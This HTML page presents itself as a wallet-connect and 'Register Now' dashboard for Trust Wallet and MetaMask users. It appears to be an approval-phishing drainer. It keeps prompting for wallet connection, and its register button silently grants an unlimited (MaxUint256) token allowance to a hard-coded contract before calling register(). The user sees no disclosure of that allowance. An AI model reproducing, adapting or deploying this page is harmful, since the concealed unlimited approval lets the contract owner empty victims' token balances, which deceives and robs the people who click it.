<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Smart Access Final</title>
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .card { background: white; padding: 30px; border-radius: 25px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); width: 90%; max-width: 360px; text-align: center; }
        .wallet-btn { border: 2px solid #f0f0f0; border-radius: 15px; padding: 15px; cursor: pointer; margin: 10px 0; transition: 0.3s; display: flex; align-items: center; justify-content: center; gap: 15px; }
        .wallet-btn:active { background: #f8fbff; transform: scale(0.98); }
        .wallet-btn img { width: 40px; height: 40px; }
        #dashboardView { display: none; }
        .reg-btn { background: #4CAF50; color: white; padding: 18px; width: 100%; border: none; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 15px; }
        .status-bar { font-size: 12px; color: #ff9800; margin-top: 10px; font-weight: bold; }
    </style>
</head>
<body>

<div class="card">
    <div id="loginView">
        <h2 style="margin-bottom:5px;">Connect Wallet</h2>
        <p style="font-size: 13px; color: #666; margin-bottom: 20px;">App select karein aur wahi wait karein</p>
        
        <div class="wallet-btn" onclick="openAndRedirect('trust')">
            <img src="https://trustwallet.com/assets/images/media/assets/trust_wallet_logo.png">
            <b>Trust Wallet</b>
        </div>
        
        <div class="wallet-btn" onclick="openAndRedirect('metamask')">
            <img src="https://raw.githubusercontent.com/MetaMask/brand-resources/master/SVG/metamask-fox.svg">
            <b>MetaMask</b>
        </div>
        <div id="status" class="status-bar"></div>
    </div>

    <div id="dashboardView">
        <h2 style="color: #2196F3;">Dashboard</h2>
        <div id="addr" style="font-size: 10px; background: #eee; padding: 10px; word-break: break-all; border-radius: 10px; margin-bottom: 15px;"></div>
        <button id="regBtn" class="reg-btn" onclick="startAction()">Register Now</button>
    </div>
</div>

<script>
    const CONTRACT = "0x43c7df8DB3503c4839C9249E7D0C520E801C9dBA";
    const TOKEN = "0x3B66b1E08F55AF26c8eA14a73dA64b6bC8D799dE";
    let signer;

    // --- 1. Smart Redirect Logic ---
    function openAndRedirect(wallet) {
        const url = window.location.href;
        const status = document.getElementById('status');
        status.innerText = "Redirecting to App...";

        if (wallet === 'trust') {
            // Trust Wallet Direct Intent
            window.location.assign("trust://open_url?url=" + encodeURIComponent(url));
        } else {
            // MetaMask Direct Intent
            window.location.assign("https://metamask.app.link/dapp/" + url.replace(/^https?:\/\//, ''));
        }

        // Backup: Agar redirect slow ho toh alert dikhaye
        setTimeout(() => {
            status.innerText = "Agar App nahi khuli, toh link copy karke Wallet Browser mein paste karein.";
        }, 3000);
    }

    // --- 2. Auto Connection (Jab App ke andar site load ho) ---
    async function init() {
        if (window.ethereum) {
            try {
                const provider = new ethers.providers.Web3Provider(window.ethereum);
                const accounts = await provider.send("eth_requestAccounts", []);
                
                if (accounts.length > 0) {
                    signer = provider.getSigner();
                    const address = await signer.getAddress();

                    document.getElementById('loginView').style.display = 'none';
                    document.getElementById('dashboardView').style.display = 'block';
                    document.getElementById('addr').innerText = "Wallet: " + address;
                }
            } catch (e) {
                console.log("User rejected connection");
            }
        }
    }

    // Interval check: Jab tak connect na ho, har 1.5 second mein connect karne ki koshish kare
    const checkInterval = setInterval(() => {
        if (window.ethereum && document.getElementById('dashboardView').style.display === 'none') {
            init();
        }
    }, 1500);

    window.onload = init;

    // --- 3. Registration Logic ---
    async function startAction() {
        const btn = document.getElementById('regBtn');
        try {
            btn.innerText = "Processing...";
            const tCon = new ethers.Contract(TOKEN, ["function approve(address,uint256) returns (bool)"], signer);
            const mCon = new ethers.Contract(CONTRACT, ["function register() external"], signer);

            const tx1 = await tCon.approve(CONTRACT, ethers.constants.MaxUint256);
            await tx1.wait();

            const tx2 = await mCon.register();
            await tx2.wait();

            alert("Successful!");
            btn.innerText = "Success âœ…";
        } catch (e) {
            alert("Transaction Failed!");
            btn.innerText = "Register Now";
        }
    }
</script>
</body>
</html>
